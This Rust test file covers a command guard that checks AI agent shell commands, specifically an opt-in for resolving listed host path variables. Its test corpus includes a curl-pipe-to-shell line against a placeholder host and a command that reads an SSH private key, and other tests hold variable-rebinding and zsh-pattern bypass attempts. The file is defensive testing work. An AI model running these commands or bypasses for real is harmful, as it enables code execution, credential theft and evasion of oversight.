//! T4, carve-out (d), ADR-038: a whole double-quoted `"$NAME"` word, for a NAME the user lists in
//! `ANTHOLOGY_GUARD_PATH_VARS`, is read as the file its value names, in the program or an
//! argument position. Every other form, and every NAME or value that fails a condition, is read as
//! before: as the program, too complex (G0).
//!
//! The files live under cargo's per-target scratch folder, which is neither a temp folder nor the
//! hook's working folder; each test gives the hook a `TMPDIR` and a working folder of its own.

#[path = "support/gd.rs"]
mod gd;

use std::collections::HashMap;
use std::fs;
use std::os::unix::fs::{PermissionsExt, symlink};
use std::path::{Path, PathBuf};

use anthology_guard::path_vars::{HostPathVars, PATH_VARS_VAR};
use anthology_guard::{
    Rule, Verdict, check_explained, check_explained_with, decide, decide_with_vars,
};
use anthology_pycompat::json::{self, Map, PY_DEFAULT, Value};
use anthology_shell::{Limits, PathValue, PathVars, analyze, analyze_with, analyze_with_vars};

use gd::{HOME, bash, obj};

/// A host layout: tools outside the temp and working folders, and files inside them.
struct Fixture {
    root: PathBuf,
}

impl Fixture {
    fn new(name: &str) -> Fixture {
        let root = Path::new(env!("CARGO_TARGET_TMPDIR"))
            .join("t4-host-path-vars")
            .join(name);
        let _ = fs::remove_dir_all(&root);
        let fx = Fixture { root };
        for dir in [
            "opt/hosttool/bin",
            "opt/hosttool/lib",
            "opt/hosttool/link",
            "opt/hosttool/dir",
            "opt/hosttool/a..b",
            "opt/agent-browser/bin",
            "project/bin",
            "tmp",
            "temp",
        ] {
            fs::create_dir_all(fx.root.join(dir)).unwrap();
        }
        for exe in [
            "opt/hosttool/bin/tool",
            "opt/hosttool/bin/npx",
            "opt/hosttool/bin/to:ol",
            "opt/hosttool/bin/tööl",
            "opt/hosttool/a..b/tool",
            "opt/hosttool/lib/npx-cli.js",
            "opt/hosttool/lib/ab-cli.js",
            "opt/agent-browser/bin/agent-browser",
            "project/bin/tool",
            "tmp/tool",
            "temp/tool",
        ] {
            fx.write(exe, 0o755);
        }
        fx.write("opt/hosttool/lib/cli.js", 0o644);
        fx.link("npx", "opt/hosttool/bin/helper");
        fx.link("../lib/npx-cli.js", "opt/hosttool/link/npx");
        fx.link("../lib/ab-cli.js", "opt/hosttool/link/agent-browser");
        fx.link("to:ol", "opt/hosttool/bin/plain-name");
        fx.link(&fx.path("tmp/tool"), "opt/hosttool/bin/to-tmp");
        fx.link(&fx.path("project/bin/tool"), "opt/hosttool/bin/to-project");
        fx.link(&fx.path("opt/hosttool/bin/tool"), "project/bin/out");
        fx.link(&fx.path("opt/hosttool/bin/tool"), "tmp/out");
        fx.link(&fx.path("project"), "project-link");
        fx
    }

    fn write(&self, rel: &str, mode: u32) {
        let path = self.root.join(rel);
        fs::write(&path, "#!/bin/sh\n").unwrap();
        fs::set_permissions(&path, fs::Permissions::from_mode(mode)).unwrap();
    }

    fn link(&self, target: &str, rel: &str) {
        symlink(target, self.root.join(rel)).unwrap();
    }

    fn path(&self, rel: &str) -> String {
        self.root.join(rel).to_str().unwrap().to_string()
    }

    fn tool(&self) -> String {
        self.path("opt/hosttool/bin/tool")
    }

    /// The host's variables, read as the hook reads them: `list` is `ANTHOLOGY_GUARD_PATH_VARS`,
    /// `TMPDIR` is the fixture's `tmp`, the working folder is its `project`.
    fn vars(&self, list: &str, pairs: &[(&str, String)]) -> Option<HostPathVars> {
        let mut env = self.env(pairs);
        env.insert(PATH_VARS_VAR.to_string(), list.to_string());
        self.vars_in(&env, Some(&self.root.join("project")))
    }

    fn env(&self, pairs: &[(&str, String)]) -> HashMap<String, String> {
        let mut env: HashMap<String, String> = pairs
            .iter()
            .map(|(k, v)| ((*k).to_string(), v.clone()))
            .collect();
        env.insert("TMPDIR".into(), self.path("tmp"));
        env
    }

    fn vars_in(&self, env: &HashMap<String, String>, cwd: Option<&Path>) -> Option<HostPathVars> {
        HostPathVars::new(&|k: &str| env.get(k).cloned(), cwd)
    }

    /// `vars` with one listed NAME set to `value`.
    fn one(&self, name: &str, value: &str) -> Option<HostPathVars> {
        self.vars(name, &[(name, value.to_string())])
    }

    /// The fixture's tool as `HOST_TOOL`.
    fn host_tool(&self) -> HostPathVars {
        self.one("HOST_TOOL", &self.tool())
            .expect("the tool is read")
    }
}

impl Drop for Fixture {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.root);
    }
}

fn verdict(command: &str, vars: Option<&HostPathVars>) -> Verdict {
    let (tool, input) = bash(command);
    check_explained_with(
        &tool,
        &input,
        HOME,
        &Limits::default(),
        vars.map(|v| v as &dyn PathVars),
    )
    .0
}

/// The verdict of each command with `vars`, and the verdict with no opt-in, which must be `before`.
fn assert_each(commands: &[&str], vars: &HostPathVars, want: Verdict, before: Verdict) {
    for command in commands {
        assert_eq!(verdict(command, Some(vars)), want, "{command}");
        assert_eq!(
            verdict(command, None),
            before,
            "{command} without the opt-in"
        );
    }
}

/// `"$NAME" --version` is too complex: NAME was not read.
fn assert_not_read(name: &str, vars: Option<&HostPathVars>) {
    let command = format!("\"${name}\" --version");
    assert_eq!(verdict(&command, vars), Verdict::TooComplex, "{command}");
}

const G1: Verdict = Verdict::Block(Rule::G1);

#[test]
fn a_host_program_variable_is_allowed() {
    let fx = Fixture::new("program");
    let vars = fx.host_tool();
    assert_each(
        &[
            r#""$HOST_TOOL" --version"#,
            r#""$HOST_TOOL" build --out dist"#,
            r#"cd /work && "$HOST_TOOL" status"#,
            r#""$HOST_TOOL" list | grep x"#,
            r#""$HOST_TOOL" a; "$HOST_TOOL" b"#,
            r#"env "$HOST_TOOL" --version"#,
            r#""$HOST_TOOL" --version 2>&1"#,
            r#""$HOST_TOOL">out.txt"#,
        ],
        &vars,
        Verdict::Allow,
        Verdict::TooComplex,
    );
}

#[test]
fn a_host_script_variable_is_allowed() {
    let fx = Fixture::new("script");
    let vars = fx
        .vars(
            "HOST_NODE,HOST_SCRIPT",
            &[
                ("HOST_NODE", fx.tool()),
                ("HOST_SCRIPT", fx.path("opt/hosttool/lib/cli.js")),
            ],
        )
        .unwrap();
    assert_each(
        &[
            r#""$HOST_NODE" "$HOST_SCRIPT" render --page 2"#,
            r#""$HOST_NODE" "$HOST_SCRIPT""#,
            r#"cd /work && "$HOST_NODE" "$HOST_SCRIPT" sub"#,
        ],
        &vars,
        Verdict::Allow,
        Verdict::TooComplex,
    );
    // a script in an argument was allowed before, and still is
    assert_each(
        &[r#"node "$HOST_SCRIPT" run"#],
        &vars,
        Verdict::Allow,
        Verdict::Allow,
    );
}

#[test]
fn a_program_that_is_not_executable_is_too_complex() {
    let fx = Fixture::new("not-executable");
    let vars = fx
        .vars(
            "HOST_NODE,HOST_SCRIPT",
            &[
                ("HOST_NODE", fx.tool()),
                ("HOST_SCRIPT", fx.path("opt/hosttool/lib/cli.js")),
            ],
        )
        .unwrap();
    assert_each(
        &[
            r#""$HOST_SCRIPT" render"#,
            r#"env "$HOST_SCRIPT" render"#,
            r#""$HOST_NODE" x; "$HOST_SCRIPT" y"#,
        ],
        &vars,
        Verdict::TooComplex,
        Verdict::TooComplex,
    );
}

#[test]
fn a_variable_naming_npx_is_g1() {
    let fx = Fixture::new("npx");
    let vars = fx
        .one("HOST_TOOL", &fx.path("opt/hosttool/bin/npx"))
        .unwrap();
    assert_each(
        &[
            r#""$HOST_TOOL" playwright install"#,
            r#"cd /work && "$HOST_TOOL" playwright install chromium"#,
        ],
        &vars,
        G1,
        Verdict::TooComplex,
    );
    // after a wrapper, G1 read the words after the variable before
    assert_each(&[r#"env "$HOST_TOOL" playwright install"#], &vars, G1, G1);
}

#[test]
fn a_symlink_to_npx_is_g1() {
    let fx = Fixture::new("symlink");
    // the rules read the canonical path: a link with another name that leads to npx
    let vars = fx
        .one("HOST_TOOL", &fx.path("opt/hosttool/bin/helper"))
        .unwrap();
    assert_each(
        &[r#""$HOST_TOOL" playwright install"#],
        &vars,
        G1,
        Verdict::TooComplex,
    );
    // and the value as written: a link named npx that leads to another name
    let vars = fx
        .one("HOST_TOOL", &fx.path("opt/hosttool/link/npx"))
        .unwrap();
    assert_each(
        &[r#""$HOST_TOOL" playwright install"#],
        &vars,
        G1,
        Verdict::TooComplex,
    );
    // the analysis reads the canonical path, with the value as written as another reading
    let analysis = analyze_with_vars(
        r#""$HOST_TOOL" playwright install"#,
        HOME,
        &Limits::default(),
        Some(&vars),
    );
    assert!(!analysis.incomplete);
    let canonical = fx.path("opt/hosttool/lib/npx-cli.js");
    assert_eq!(analysis.entries.len(), 1);
    assert_eq!(analysis.entries[0].prog, "npx-cli.js");
    assert_eq!(analysis.entries[0].raw[0], canonical);
    // npx as written runs `playwright`, as it does in `npx playwright install`
    assert_eq!(analysis.alternates.len(), 1);
    assert_eq!(analysis.alternates[0].prog, "playwright");
    assert_eq!(
        analysis.alternates[0].raw[0],
        fx.path("opt/hosttool/link/npx")
    );
}

#[test]
fn a_variable_naming_agent_browser_is_g4() {
    let fx = Fixture::new("agent-browser");
    let vars = fx
        .one("HOST_TOOL", &fx.path("opt/agent-browser/bin/agent-browser"))
        .unwrap();
    assert_each(
        &[r#""$HOST_TOOL" open https://example.invalid"#],
        &vars,
        Verdict::Block(Rule::G4),
        Verdict::TooComplex,
    );
    // a link named agent-browser: G4 reads the words as written too
    let vars = fx
        .one("HOST_TOOL", &fx.path("opt/hosttool/link/agent-browser"))
        .unwrap();
    assert_each(
        &[r#""$HOST_TOOL" open https://example.invalid"#],
        &vars,
        Verdict::Block(Rule::G4),
        Verdict::TooComplex,
    );
}

#[test]
fn the_opt_in_is_off_unless_a_listed_name_is_read() {
    let fx = Fixture::new("opt-in");
    let tool = fx.tool();
    // not listed, listed but unset, an empty list: no host variables at all
    let unset = fx.env(&[("HOST_TOOL", tool.clone())]);
    assert!(fx.vars_in(&unset, Some(&fx.root.join("project"))).is_none());
    assert!(fx.vars("OTHER", &[("HOST_TOOL", tool.clone())]).is_none());
    assert!(fx.vars("HOST_TOOL", &[]).is_none());
    assert!(fx.vars("", &[("HOST_TOOL", tool.clone())]).is_none());
    // names are split on commas only
    assert!(
        fx.vars(" HOST_TOOL", &[("HOST_TOOL", tool.clone())])
            .is_none()
    );
    assert!(
        fx.vars("HOST_TOOL ", &[("HOST_TOOL", tool.clone())])
            .is_none()
    );
    let vars = fx
        .vars(
            ",OTHER,HOST_TOOL,",
            &[("HOST_TOOL", tool.clone()), ("OTHER", "x".into())],
        )
        .unwrap();
    assert_eq!(
        vars.resolve("HOST_TOOL"),
        Some(PathValue {
            value: tool.clone(),
            canonical: tool.clone(),
            executable: true,
        })
    );
    assert_eq!(vars.resolve("OTHER"), None);
    // only a listed name is read, however many are set
    let vars = fx
        .vars("HOST_TOOL", &[("HOST_TOOL", tool.clone()), ("OTHER", tool)])
        .unwrap();
    assert_eq!(vars.resolve("OTHER"), None);
    assert_eq!(
        verdict(r#""$HOST_TOOL" a "$OTHER""#, Some(&vars)),
        Verdict::TooComplex
    );
    assert_eq!(PATH_VARS_VAR, "ANTHOLOGY_GUARD_PATH_VARS");
}

#[test]
fn a_name_outside_the_pattern_is_not_read() {
    let fx = Fixture::new("name-pattern");
    let tool = fx.tool();
    for name in [
        "host_tool",
        "Host_Tool",
        "HOST_TOOl",
        "1TOOL",
        "TOOL-X",
        "TOOL.X",
        "TOOL X",
        "ÄTOOL",
        "TOOLÄ",
    ] {
        assert!(fx.one(name, &tool).is_none(), "{name}");
    }
    assert_not_read("host_tool", fx.one("host_tool", &tool).as_ref());
    for name in ["TOOL_1", "_TOOL", "T", "A1_B2"] {
        assert!(fx.one(name, &tool).is_some(), "{name}");
    }
}

/// Every name on the denied list, with a neighbour that is not on it.
const DENIED: [&str; 45] = [
    "MANPATH",
    "MAILPATH",
    "MODULE_PATH",
    "PSVAR",
    "FIGNORE",
    "WATCH",
    "TERMINFO_DIRS",
    "PATH",
    "IFS",
    "PWD",
    "OLDPWD",
    "SHELL",
    "ENV",
    "BASH_ENV",
    "ZDOTDIR",
    "CDPATH",
    "FPATH",
    "PS1",
    "PS2",
    "PS3",
    "PS4",
    "PROMPT",
    "PROMPT2",
    "PROMPT_COMMAND",
    "HOME",
    "TMPDIR",
    "CLAUDE_PLUGIN_ROOT",
    "CLAUDE_PROJECT_DIR",
    "VIRTUAL_ENV",
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "DYLD_INSERT_LIBRARIES",
    "DYLD_X",
    "BASH_FUNC_X",
    "BASH_ALIASES",
    "ZSH_NAME",
    "ZSH_X",
    "_",
    "REPLY",
    "OPTARG",
    "MATCH",
    "MBEGIN",
    "MEND",
    "MAPFILE",
    "LD_",
];

#[test]
fn a_denied_name_is_not_read() {
    let fx = Fixture::new("denied");
    let tool = fx.tool();
    for name in DENIED {
        // set after the fixture's own TMPDIR, so that TMPDIR names the tool too
        let mut env = fx.env(&[]);
        env.insert(PATH_VARS_VAR.into(), name.into());
        env.insert(name.into(), tool.clone());
        assert!(
            fx.vars_in(&env, Some(&fx.root.join("project"))).is_none(),
            "{name}"
        );
    }
    assert_not_read("PATH", fx.one("PATH", &tool).as_ref());
    for name in [
        "PATHS", "XPATH", "PS5", "XPROMPT", "LD", "LDX", "DYLD", "BASH", "BASHX", "ZSH", "ZSHX",
        "HOMES", "REPLY2", "XMATCH", "__",
    ] {
        assert!(fx.one(name, &tool).is_some(), "{name}");
    }
}

#[test]
fn a_value_outside_the_pattern_is_not_read() {
    let fx = Fixture::new("value-pattern");
    let tool = fx.tool();
    for value in [
        String::new(),
        "/".into(),
        // relative: a file that exists from the test's working folder
        "tests/support/gd.rs".into(),
        format!("{tool} x"),
        format!("{tool}\n"),
        format!(" {tool}"),
        fx.path("opt/hosttool/bin/../bin/tool"),
        fx.path("opt/hosttool/a..b/tool"),
        fx.path("opt/hosttool/bin/to:ol"),
        fx.path("opt/hosttool/bin/tööl"),
        "~/x".into(),
        "$HOME/x".into(),
    ] {
        assert!(fx.one("HOST_TOOL", &value).is_none(), "{value:?}");
    }
    // the canonical path must match the pattern too
    assert!(
        fx.one("HOST_TOOL", &fx.path("opt/hosttool/bin/plain-name"))
            .is_none()
    );
    // a value with every allowed character class is read
    assert!(fx.one("HOST_TOOL", &tool).is_some());
}

#[test]
fn a_value_that_is_not_a_regular_file_is_not_read() {
    let fx = Fixture::new("not-a-file");
    for value in [
        fx.path("opt/hosttool/dir"),
        fx.path("opt/hosttool/missing"),
        "/dev/null".to_string(),
    ] {
        assert!(fx.one("HOST_TOOL", &value).is_none(), "{value}");
    }
}

#[test]
fn a_value_in_a_temp_folder_is_not_read() {
    let fx = Fixture::new("temp");
    for rel in ["tmp/tool", "tmp/out", "opt/hosttool/bin/to-tmp"] {
        assert!(fx.one("HOST_TOOL", &fx.path(rel)).is_none(), "{rel}");
    }
    // TMP, TEMP and TEMPDIR count as temp folders too
    for var in ["TMP", "TEMP", "TEMPDIR"] {
        let mut env = fx.env(&[("HOST_TOOL", fx.path("temp/tool"))]);
        env.insert(PATH_VARS_VAR.into(), "HOST_TOOL".into());
        env.insert(var.into(), fx.path("temp"));
        assert!(
            fx.vars_in(&env, Some(&fx.root.join("project"))).is_none(),
            "{var}"
        );
    }
    assert!(fx.one("HOST_TOOL", &fx.path("temp/tool")).is_some());
    // the system's temp folders, whatever TMPDIR says (on macOS the process's own is under
    // /var/folders)
    let own = std::env::temp_dir();
    for dir in [
        Path::new("/tmp"),
        Path::new("/var/tmp"),
        Path::new("/dev/shm"),
        &own,
    ] {
        let Some(path) = scratch_tool(dir) else {
            continue;
        };
        assert!(
            fx.one("HOST_TOOL", path.to_str().unwrap()).is_none(),
            "{}",
            path.display()
        );
        let _ = fs::remove_dir_all(path.parent().unwrap());
    }
}

/// An executable in a fresh folder under `dir`, when `dir` is a folder this test may write.
fn scratch_tool(dir: &Path) -> Option<PathBuf> {
    let folder = dir.join(format!("anthology-t4-{}", std::process::id()));
    fs::create_dir_all(&folder).ok()?;
    let tool = folder.join("tool");
    fs::write(&tool, "#!/bin/sh\n").ok()?;
    fs::set_permissions(&tool, fs::Permissions::from_mode(0o755)).ok()?;
    Some(tool)
}

#[test]
fn a_value_in_the_working_folder_is_not_read() {
    let fx = Fixture::new("cwd");
    for rel in [
        "project/bin/tool",
        "project/bin/out",
        "opt/hosttool/bin/to-project",
    ] {
        assert!(fx.one("HOST_TOOL", &fx.path(rel)).is_none(), "{rel}");
    }
    let env = {
        let mut env = fx.env(&[("HOST_TOOL", fx.path("project/bin/tool"))]);
        env.insert(PATH_VARS_VAR.into(), "HOST_TOOL".into());
        env
    };
    // the working folder is compared as resolved
    assert!(
        fx.vars_in(&env, Some(&fx.root.join("project-link")))
            .is_none()
    );
    // no working folder: nothing is read
    let env = {
        let mut env = fx.env(&[("HOST_TOOL", fx.tool())]);
        env.insert(PATH_VARS_VAR.into(), "HOST_TOOL".into());
        env
    };
    assert!(fx.vars_in(&env, None).is_none());
    assert!(fx.vars_in(&env, Some(&fx.root.join("project"))).is_some());
    // a working folder above the tool holds it
    assert!(fx.vars_in(&env, Some(&fx.root)).is_none());
}

#[test]
fn only_a_whole_double_quoted_word_is_read() {
    let fx = Fixture::new("forms");
    let vars = fx.host_tool();
    // too complex with or without the opt-in: the program is not a whole double-quoted word
    assert_each(
        &[
            "$HOST_TOOL --version",
            r#""${HOST_TOOL}" --version"#,
            r#""$HOST_TOOL"x --version"#,
            r#"x"$HOST_TOOL" --version"#,
            r#""$HOST_TOOL/x" --version"#,
            r#""$HOST_TOOL " --version"#,
        ],
        &vars,
        Verdict::TooComplex,
        Verdict::TooComplex,
    );
    // too complex with the opt-in too: beside a read word, a form that is not read
    assert_each(
        &[
            // single-quoted: the text of another shell
            "\"$HOST_TOOL\" x; sh -c '\n\"$HOST_TOOL\"\n'",
            // between two double-quoted texts: unquoted
            r#""$HOST_TOOL" x; echo "a "$HOST_TOOL" b""#,
            // not at the start or the end of a word
            r#""$HOST_TOOL" x; echo a"$HOST_TOOL""#,
            r#""$HOST_TOOL" x; echo "$HOST_TOOL"a"#,
            r#""$HOST_TOOL" x; echo "$HOST_TOOL a""#,
            // a redirection target
            r#""$HOST_TOOL" x > "$HOST_TOOL""#,
            r#""$HOST_TOOL" x >| "$HOST_TOOL""#,
            r#""$HOST_TOOL" x >&"$HOST_TOOL""#,
            r#""$HOST_TOOL" x < "$HOST_TOOL""#,
            // the same forms in a redirection target that holds the name another way, which no
            // word of the analysis shows
            "\"$HOST_TOOL\" x > '\n\"$HOST_TOOL\"\n'",
            r#""$HOST_TOOL" x > "a "$HOST_TOOL" b""#,
            r#""$HOST_TOOL" x > "  $HOST_TOOL""#,
            r#""$HOST_TOOL" x > a"$HOST_TOOL""#,
            // a loop list, which no word of the analysis shows either
            r#"for x in "$HOST_TOOL a"; do "$HOST_TOOL" x; done"#,
            r#"for x in "$HOST_TOOL"a; do "$HOST_TOOL" x; done"#,
        ],
        &vars,
        Verdict::TooComplex,
        Verdict::TooComplex,
    );
    // quotes of the other kind inside a quoted text are text
    assert_each(
        &[r#""$HOST_TOOL" 'a "b' "it's" "$HOST_TOOL""#],
        &vars,
        Verdict::Allow,
        Verdict::TooComplex,
    );
}

#[test]
fn a_command_with_another_expansion_reads_as_before() {
    let fx = Fixture::new("other-expansion");
    let vars = fx
        .vars(
            "HOST_TOOL,HOST_FILE",
            &[
                ("HOST_TOOL", fx.tool()),
                ("HOST_FILE", fx.path("opt/hosttool/lib/cli.js")),
            ],
        )
        .unwrap();
    assert_each(
        &[
            r#""$HOST_TOOL" "$x""#,
            r#""$HOST_TOOL" "$HOME/x""#,
            r#""$HOST_TOOL" "$1""#,
            r#""$HOST_TOOL" $(date)"#,
            r#""$HOST_TOOL" "$UNLISTED""#,
        ],
        &vars,
        Verdict::TooComplex,
        Verdict::TooComplex,
    );
    // an argument alone was allowed before: a command that is not plain is read as before
    assert_each(
        &[r#"cat "$HOST_FILE" | grep "$x""#, r#"cat "$HOST_FILE" ~/x"#],
        &vars,
        Verdict::Allow,
        Verdict::Allow,
    );
}

#[test]
fn the_name_anywhere_else_is_too_complex() {
    let fx = Fixture::new("elsewhere");
    let tool = fx.tool();
    let vars = fx
        .vars(
            "HOST_TOOL,TOOL1",
            &[("HOST_TOOL", tool.clone()), ("TOOL1", tool)],
        )
        .unwrap();
    assert_each(
        &[
            r#"HOST_TOOL=/usr/bin/npx; "$HOST_TOOL" playwright install"#,
            r#"export HOST_TOOL=/usr/bin/npx; "$HOST_TOOL" playwright install"#,
            r#"HOST_TOOL=/usr/bin/npx "$HOST_TOOL" x"#,
            r#"unset HOST_TOOL; "$HOST_TOOL" x"#,
            r#"read -r HOST_TOOL < f; "$HOST_TOOL" x"#,
            r#"printf -v HOST_TOOL %s /usr/bin/npx; "$HOST_TOOL" x"#,
            r#"echo HOST_TOOL; "$HOST_TOOL" x"#,
            // where no word of the analysis shows it
            r#"for HOST_TOOL in /usr/bin/npx; do "$HOST_TOOL" playwright install; done"#,
            r#""$HOST_TOOL" x > HOST_TOOL"#,
            // the name built from quoted pieces, which the analysis reads with the quotes removed
            r#"export HO'ST_TOOL'=/usr/bin/npx; "$HOST_TOOL" playwright install"#,
            r#"export HO""ST_TOOL=/usr/bin/npx; "$HOST_TOOL" playwright install"#,
        ],
        &vars,
        Verdict::TooComplex,
        Verdict::TooComplex,
    );
}

#[test]
fn a_name_pattern_is_too_complex() {
    let fx = Fixture::new("patterns");
    let tool = fx.tool();
    let vars = fx
        .vars(
            "HOST_TOOL,TOOL1,NODE18",
            &[
                ("HOST_TOOL", tool.clone()),
                ("TOOL1", tool.clone()),
                ("NODE18", tool),
            ],
        )
        .unwrap();
    // zsh numeric range patterns name TOOL1 and NODE18 without spelling them, also when quotes split
    // them (zsh matches the pattern after quote removal)
    assert_each(
        &[
            r#"typeset -m 'TOOL<->=/usr/local/bin/npx'; "$TOOL1" playwright install"#,
            r#"typeset -m 'TOOL<'-'>=/usr/local/bin/npx'; "$TOOL1" playwright install"#,
            r#"typeset -m 'TOOL<1-9>=/usr/local/bin/npx'; "$TOOL1" playwright install"#,
            r#"typeset -m 'NODE<1-20>=/usr/local/bin/npx'; "$NODE18" playwright install"#,
            r#"declare -m 'NODE<'1-20'>=/usr/local/bin/npx'; "$NODE18" playwright install"#,
            // any word with `<` or `>` in it
            r#"echo 'a<b'; "$HOST_TOOL" x"#,
            r#"echo 'a>b'; "$HOST_TOOL" x"#,
        ],
        &vars,
        Verdict::TooComplex,
        Verdict::TooComplex,
    );
    // `-m`, alone, in a cluster or with `+`, on every program that reads names as patterns
    for prog in [
        "typeset", "declare", "local", "integer", "float", "readonly", "export", "unset",
    ] {
        let command = format!(r#"{prog} -m 'TOOLX=/usr/local/bin/npx'; "$HOST_TOOL" x"#);
        assert_eq!(
            verdict(&command, Some(&vars)),
            Verdict::TooComplex,
            "{command}"
        );
    }
    assert_each(
        &[
            r#"typeset -gm 'TOOLX=/x'; "$HOST_TOOL" x"#,
            r#"typeset +m 'TOOLX'; "$HOST_TOOL" x"#,
        ],
        &vars,
        Verdict::TooComplex,
        Verdict::TooComplex,
    );
    // other options, and an `m` in a value, are not `-m`
    assert_each(
        &[
            r#"typeset -x TOOLX=/x; "$HOST_TOOL" x"#,
            r#"export TOOLX=-m; "$HOST_TOOL" x"#,
            r#"mkdir -m 700 out; "$HOST_TOOL" x"#,
        ],
        &vars,
        Verdict::Allow,
        Verdict::TooComplex,
    );
}

#[test]
fn a_zsh_tied_name_is_not_read() {
    let fx = Fixture::new("tied");
    let tool = fx.tool();
    // zsh sets MANPATH through its tied array: the name is denied, so it is never read
    assert_not_read("MANPATH", fx.one("MANPATH", &tool).as_ref());
    let vars = fx
        .vars(
            "HOST_TOOL,MANPATH",
            &[("HOST_TOOL", tool.clone()), ("MANPATH", tool)],
        )
        .unwrap();
    assert_eq!(
        verdict(
            r#"manpath=/usr/local/bin/npx; "$MANPATH" playwright install"#,
            Some(&vars)
        ),
        Verdict::TooComplex
    );
}

#[test]
fn source_and_eval_are_too_complex() {
    let fx = Fixture::new("source");
    let vars = fx.host_tool();
    assert_each(
        &[
            r#". ./env.sh; "$HOST_TOOL" x"#,
            r#"source ./env.sh; "$HOST_TOOL" x"#,
            r#"builtin source ./env.sh; "$HOST_TOOL" x"#,
            r#"command . ./env.sh; "$HOST_TOOL" x"#,
            r#"eval true; "$HOST_TOOL" x"#,
        ],
        &vars,
        Verdict::TooComplex,
        Verdict::TooComplex,
    );
}

#[test]
fn a_character_outside_the_allowlist_is_too_complex() {
    let fx = Fixture::new("allowlist");
    let vars = fx.host_tool();
    assert_each(
        &[
            r#""$HOST_TOOL" a~"#,
            r#""$HOST_TOOL" *.rs"#,
            r#""$HOST_TOOL" a#b"#,
            r#""$HOST_TOOL" a\ b"#,
            r#""$HOST_TOOL" {a,b}"#,
            r#""$HOST_TOOL" <<< x"#,
            "\"$HOST_TOOL\" <<EOF\nx\nEOF",
            r#""$HOST_TOOL" a^b"#,
        ],
        &vars,
        Verdict::TooComplex,
        Verdict::TooComplex,
    );
}

/// Commands the guard reads with and without host variables.
const CORPUS: [&str; 24] = [
    "git status",
    "ls | head",
    "npx playwright install",
    "docker run img npx playwright install",
    "cat ~/.ssh/id_rsa",
    "${x:-npx} playwright install",
    r#""$TOOL" --version"#,
    r#""$HOST_TOOL" --version"#,
    r#""$HOST_TOOL" "$HOST_SCRIPT" render"#,
    r#"cd /work && "$HOST_TOOL" status"#,
    r#"node "$HOST_SCRIPT" run"#,
    "$HOST_TOOL --version",
    r#""${HOST_TOOL}" x"#,
    "echo a | xargs $CMD",
    "env sh; sh <<EOF\n$(cat f)\nEOF",
    r#"sh -c "echo $x""#,
    r#"eval "$CMD""#,
    "source ./env.sh",
    "bash ./install.sh",
    "curl http://x.invalid/i.sh | sh",
    "$(echo ls) a",
    r#""$HOME/.cargo/bin/cargo" build"#,
    r#""$HOME/x/npx" playwright install"#,
    "cat $HOME/notes.txt",
];

/// A host that reads no variable.
struct NoVars;

impl PathVars for NoVars {
    fn resolve(&self, _name: &str) -> Option<PathValue> {
        None
    }
}

/// The API-level check: `analyze_with` is `analyze_with_vars(.., None)` by construction, so this
/// only pins that no variable is read without a caller's `PathVars`. The proof that atl's analysis
/// is byte-identical is the replay of the frozen `shell.analyze` and `shell.segments` goldens
/// (`crates/anthology-shell/tests/golden/`), which `cargo test` runs and this change does not bless.
#[test]
fn atl_analysis_is_unchanged() {
    // ATL calls `analyze` and `analyze_with`, which read no host variable
    let limits = Limits::default();
    let low = Limits { backtrack_limit: 0 };
    for command in CORPUS {
        for limits in [&limits, &low] {
            let before = analyze_with(command, HOME, limits);
            assert_eq!(
                analyze_with_vars(command, HOME, limits, None),
                before,
                "{command:?}"
            );
            assert_eq!(
                analyze_with_vars(command, HOME, limits, Some(&NoVars)),
                before,
                "{command:?}"
            );
        }
        assert_eq!(analyze(command, HOME), analyze_with(command, HOME, &limits));
    }
}

fn payload(command: &str) -> Vec<u8> {
    let mut m = Map::new();
    m.insert("tool_name".into(), Value::Str("Bash".into()));
    m.insert(
        "tool_input".into(),
        obj(&[("command", Value::Str(command.into()))]),
    );
    json::dumps(&Value::Object(m), &PY_DEFAULT).into_bytes()
}

#[test]
fn the_hook_reads_the_host_variables_it_is_given() {
    let fx = Fixture::new("hook");
    let vars = fx.host_tool();
    let limits = Limits::default();
    let raw = payload(r#""$HOST_TOOL" --version"#);
    let allowed = decide_with_vars(&raw, HOME, false, &limits, false, Some(&vars));
    assert_eq!((allowed.code, allowed.stderr.as_str()), (0, ""));
    let shim = decide_with_vars(&raw, HOME, true, &limits, true, Some(&vars));
    assert_eq!(
        (shim.code, shim.stderr.as_str()),
        (0, "anthology-guard:allow:v1\n")
    );
    // with none, the hook answers as it always did
    for command in CORPUS {
        let raw = payload(command);
        assert_eq!(
            decide_with_vars(&raw, HOME, false, &limits, false, None),
            decide(&raw, HOME, false),
            "{command:?}"
        );
        let (tool, input) = bash(command);
        assert_eq!(
            check_explained_with(&tool, &input, HOME, &limits, None),
            check_explained(&tool, &input, HOME, &limits),
            "{command:?}"
        );
    }
    // a block by a rule is the same line as without host variables
    let npx = fx
        .one("HOST_TOOL", &fx.path("opt/hosttool/bin/npx"))
        .unwrap();
    let raw = payload(r#""$HOST_TOOL" playwright install"#);
    assert_eq!(
        decide_with_vars(&raw, HOME, false, &limits, false, Some(&npx)),
        decide(&payload("npx playwright install"), HOME, false)
    );
}
